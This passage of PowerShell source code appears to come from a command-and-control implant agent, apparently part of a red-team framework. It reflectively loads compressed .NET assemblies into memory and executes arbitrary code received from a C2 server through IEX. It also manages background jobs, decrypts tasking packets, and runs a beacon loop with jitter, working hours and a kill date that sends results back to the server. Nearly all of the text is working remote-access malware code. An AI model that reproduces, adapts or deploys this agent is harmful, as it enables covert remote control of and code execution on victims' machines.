                    $jsonObject = $jsonString | ConvertFrom-Json

                    $commandArray = @()
                    foreach ($keyValue in $jsonObject.PSObject.Properties) {
                        $commandArray += $keyValue.Value
                    }
                    $bytes = [System.Convert]::FromBase64String($parts[0]);
                    $ms = New-Object System.IO.MemoryStream;
                    $output = New-Object System.IO.MemoryStream;
                    $ms.Write($bytes, 0, $bytes.Length);
                    $ms.Seek(0, 0) | Out-Null;
                    $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress);
                    $buffer = [System.Byte[]]::CreateInstance([System.Byte], 4096);
                    $bytesRead = $sr.Read($buffer, 0, $buffer.Length);

                    while ($bytesRead -ne 0) {
                        $output.Write($buffer, 0, $bytesRead);
                        $bytesRead = $sr.Read($buffer, 0, $buffer.Length);
                    }
                    $assemBytes = $output.ToArray();
                    $assembly = [Reflection.Assembly]::Load($assemBytes)

                    $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
                    $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);

                    $ps = [PowerShell]::Create();
                    $dict = @{
                        "assembly" = $assembly;
                        "args"     = $commandArray;
                        "pipe"     = $pipeClientStream;
                    }

                    $task = $ps.AddScript('
                        [CmdletBinding()]
                        param(
                            [System.Reflection.Assembly]
                            $assembly,

                            [String[]]
                            $args,

                            [IO.Pipes.AnonymousPipeClientStream]
                            $pipe
                        )

                        try {
                            $writer = New-Object System.IO.StreamWriter($pipe)
                            $writer.AutoFlush = $true
                            $writer.WriteLine("ready")

                            Start-Sleep -Milliseconds 1000

                            $arguments = @(,[string[]]$args)
                            $streamProp = $assembly.GetType("Program").GetProperty("OutputStream")
                            if ($streamProp) {
                                $streamProp.SetValue($null, $pipe, $null)
                            }

                            $pipeWriter = New-Object System.IO.StreamWriter($pipe)
                            $pipeWriter.AutoFlush = $true
                            $originalConsoleOut = [Console]::Out
                            [Console]::SetOut($pipeWriter)

                            $assembly.EntryPoint.Invoke($null, $arguments)
                        }
                        finally {
                            $pipe.Dispose()
                            [Console]::SetOut($originalConsoleOut)
                        }
                    ').AddParameters($dict).BeginInvoke()

                    $scriptString = {
                        param($pipeServerStream, $ps, $task)
                        try {
                            $outputCollector = [Text.StringBuilder]::new()
                            $streamReader = New-Object System.IO.StreamReader($pipeServerStream)
                            $readyMessage = $streamReader.ReadLine()
                            $buffer = [char[]]::new($pipeServerStream.InBufferSize)

                            if ($readyMessage -eq "ready") {
                                while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
                                    if ($read -gt 0) {
                                        $outputChunk = -join $buffer[0..($read - 1)]
                                        [void]$outputCollector.Append($outputChunk)
                                    }
                                }

                                # Send full output after pipe closes
                                $output = $outputCollector.ToString().TrimEnd()
                                if (-not [string]::IsNullOrWhiteSpace($output)) {
                                    $output
                                }
                            }
                        }
                        finally {
                            $ps.EndInvoke($task)
                            $script:tasks[$ResultID]['status'] = 'completed';
                        }
                    }

                    $AppDomain = [AppDomain]::CreateDomain($ResultID);
                    $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
                    $parameters = @{
                        "pipeServerStream" = $pipeServerStream;
                        "ps"               = $ps;
                        "task"             = $task;
                    }

                    $null = $PSHost.AddScript($ScriptString).AddParameters($parameters)

                    $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]';
                    $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]';
                    $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]));
                    $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)));

                    $Script:tasks[$ResultID] = @{
                        "result_id" = $ResultID
                        "packet_type" = $type
                        "status" = "running"
                        "thread" = $Job
                        "language" = $null
                        "powershell" = @{
                            "app_domain" = $AppDomain
                            "ps_host" = $PSHost
                            "buffer" = $Buffer
                            "ps_host_exec" = $null
                        }
                    }

                    $script:tasks[$ResultID]['status'] = 'running';
                    $script:ResultIDs[$ResultID] = $ResultID;
                    Encode-Packet -type $type -data ("Job started: " + $ResultID) -ResultID $ResultID;
                } catch {
                    $errorMessage = $_.Exception.Message;
                    Encode-Packet -type 0 -data "[!] Error while executing assembly: $errorMessage" -ResultID $ResultID;
                    if ($script:tasks[$ResultID]) {
                        $script:tasks[$ResultID]['status'] = 'error';
                    }
                }
            }
            # return the currently running jobs
            elseif($type -eq 50) {
                # Filter the tasks and create a list of strings for each task
                $taskLines = @("Task ID | Status")
                $taskLines += "-" * 20
                foreach ($task_id in $script:tasks.Keys) {
                    $task_info = $script:tasks[$task_id]
                    $taskLine = "$task_id | $($task_info.status)"
                    $taskLines += $taskLine
                }

                $tasksOutput = $taskLines -join "`n"
                Encode-Packet -data ("`n$tasksOutput") -type $type -ResultID $ResultID
                $script:tasks[$ResultID]['status'] = 'completed'
            }

            # stop and remove a specific job if it's running
            elseif($type -eq 51) {
                $JobName = $data;
                $JobResultID = $ResultIDs[$JobName];

                try {
                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
                    # send result data if there is any
                    if($Results -and $($Results.trim() -ne '')) {
                        Encode-Packet -type $type -data $($Results) -ResultID $JobResultID;
                    }
                    Encode-Packet -type 51 -data "Job $JobName killed." -ResultID $JobResultID;
                    $script:tasks[$ResultID]['status'] = 'completed'
                }
                catch {
                    Encode-Packet -type 0 -data "[!] Error in stopping job: $JobName" -ResultID $JobResultID;
                    $script:tasks[$ResultID]['status'] = 'error'
                }
            }

            # socks proxy server
            elseif($type -eq 60) {
                Encode-Packet -type 0 -data '[!] SOCKS server not implemented' -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'unimplemented'
            }

            # socks proxy server data
            elseif($type -eq 61) {
                Encode-Packet -type 0 -data '[!] SOCKS server data not implemented' -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'unimplemented'
            }

            # dynamic code execution, wait for output, don't save output
            elseif($type -eq 100) {
                $ResultData = IEX $data;
                if($ResultData) {
                    Encode-Packet -type $type -data $ResultData -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'completed'
                }
            }
            # dynamic code execution, wait for output, save output
            elseif($type -eq 101) {
                # format- [15 chars of prefix][5 chars extension][data]
                $prefix = $data.Substring(0,15);
                $extension = $data.Substring(15,5);
                $data = $data.Substring(20);

                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'completed'
            }

            # dynamic code execution, no wait, don't save output
            elseif($type -eq 102) {
                $jobID = Start-AgentJob $data;
                $script:ResultIDs[$jobID]=$resultID;
                Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'running'
            }

            elseif($type -eq 220) {
                #Dynamically update agent comms
                try {
                    IEX $data

                    Encode-Packet -type $type -data "[+] Switched the current listener to: $CurrentListenerName" -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'completed'
                }
                catch {
                    Encode-Packet -type 0 -data ("[!] Unable to update agent comm methods: $_") -ResultID $ResultID;
                    $script:tasks[$ResultID]['status'] = 'error'
                }
            }

            elseif($type -eq 221) {
                # Update the listener name variable
                $script:CurrentListenerName = $data;

                Encode-Packet -type $type -data "[+] Updated the CurrentListenerName to: $CurrentListenerName" -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'completed'
            }

            else{
                Encode-Packet -type 0 -data "[!] invalid type: $type" -ResultID $ResultID;
                $script:tasks[$ResultID]['status'] = 'error'
            }
        }
        catch [System.Exception] {
            Encode-Packet -type $type -data "[!] error running command: $_" -ResultID $ResultID;
            $script:tasks[$ResultID]['status'] = 'error'
        }
    }

    # process tasking packets from the server
    function Process-TaskingPackets {
        param($Tasking)

        # Decrypt the tasking and process it appropriately
        $TaskingBytes = Decrypt-Bytes -Key $Script:SessionKey -In $Tasking;
        if (-not $TaskingBytes) {
            return;
        }

        # decode the first packet
        $Decoded = Decode-Packet $TaskingBytes;
        $Type = $Decoded[0];
        $TotalPackets = $Decoded[1];
        $PacketNum = $Decoded[2];
        $TaskID = $Decoded[3];
        $Length = $Decoded[4];
        $Data = $Decoded[5];
        # TODO: logic to handle taskings that span multiple packets

        # any remaining sections of the packet
        $Remaining = $Decoded[6];

        # process the first part of the packet
        $ResultPackets = $(Process-Tasking $Type $Data $TaskID);

        $Offset = 12 + $Length;
        # process any additional packets in the tasking
        while($Remaining.Length -ne 0) {
            $Decoded = Decode-Packet $TaskingBytes $Offset;
            $Type = $Decoded[0];
            $TotalPackets = $Decoded[1];
            $PacketNum = $Decoded[2];
            $TaskID = $Decoded[3];
            $Length = $Decoded[4];
            $Data = $Decoded[5];
            if ($Decoded.Count -eq 7) {$Remaining = $Decoded[6]};
            # process the new sub-packet and add it to the result set
            $ResultPackets += $(Process-Tasking $Type $Data $TaskID);

            $Offset += $(12 + $Length);
        }

        # send all the result packets back to the C2 server
        (& $SendMessage -Packets $ResultPackets);
    }


    ############################################################
    #
    # Main agent loop
    #
    ############################################################

    while ($True) {

        # check the kill date and lost limit, exiting and returning job output if either are past
        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {

            $Packets = $null;(& $GetTask);

            # get any job results and kill the jobs
            ForEach($JobName in $script:tasks.Keys) {
                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
                $JobResultID = $script:ResultIDs[$JobName];
                $Packets += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
                $script:ResultIDs.Remove($JobName);
            }

            # send job results back if there are any
            if ($Packets) {
                (& $SendMessage -Packets $Packets);
            }

            # send an exit status message and exit
            if (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
                $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate";
            }
            else {
                $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached";
            }
            (& $SendMessage -Packets $(Encode-Packet -type 2 -data $msg));
            exit;
        }

        # if there are working hours set, make sure we're operating within the given time span
        #   format is "8:00-17:00"
        if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$') {

            $current = Get-Date;
            $start = Get-Date ($script:WorkingHours.split("-")[0]);
            $end = Get-Date ($script:WorkingHours.split("-")[1]);

            # correct for hours that span overnight
            if (($end-$start).hours -lt 0) {
                $start = $start.AddDays(-1);
            }

            # if the current time is past the start time
            $startCheck = $current -ge $start;

            # if the current time is less than the end time
            $endCheck = $current -le $end;

            # if the current time falls outside the window
            if ((-not $startCheck) -or (-not $endCheck)) {

                # sleep until the operational window starts again
                $sleepSeconds = ($start - $current).TotalSeconds;

                if($sleepSeconds -lt 0) {
                    # correct for hours that span overnight
                    $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds;
                }
                # sleep until the wake up interval
                Start-Sleep -Seconds $sleepSeconds;
            }
        }

        # if there's a delay (i.e. no interactive/delay 0) then sleep for the specified time
        if ($script:AgentDelay -ne 0) {
            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay);
            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay);

            if ($SleepMin -eq $SleepMax) {
                $SleepTime = $SleepMin;
            }
            else{
                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax;
            }
            Start-Sleep -Seconds $sleepTime;
        }

        # poll running jobs, receive any data, and remove any completed jobs
        $JobResults = $Null;
        $JobNames = $Script:tasks.Keys | ForEach-Object { $_ }

        ForEach($JobName in $JobNames) {
            $JobResultID = $script:ResultIDs[$JobName]
            $taskStatus = $script:tasks[$JobName]['status']

            if ($taskStatus -eq 'completed' -or $taskStatus -eq 'stopped') {
                continue;  # Skip already completed or stopped tasks
            }

            # Check if the task is running and completed
            if ($taskStatus -eq 'running') {
                $jobCompleted = Get-AgentJobCompleted -JobName $JobName
                if ($jobCompleted) {
                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
                }
                else {
                    $Results = Receive-AgentJob -JobName $JobName | fl | Out-String
                }
            }

            if ($Results) {
                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
            }
        }

        if ($JobResults) {
            ((& $SendMessage -Packets $JobResults));
        }

        # get the next task from the server
        $TaskData = (& $GetTask);
        if ($TaskData) {
            $script:MissedCheckins = 0;
            # did we get not get the default response
            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
                Decode-RoutingPacket -PacketData $TaskData;
            }
        }

        # force garbage collection to clean up :)
        [GC]::Collect();
    }
}
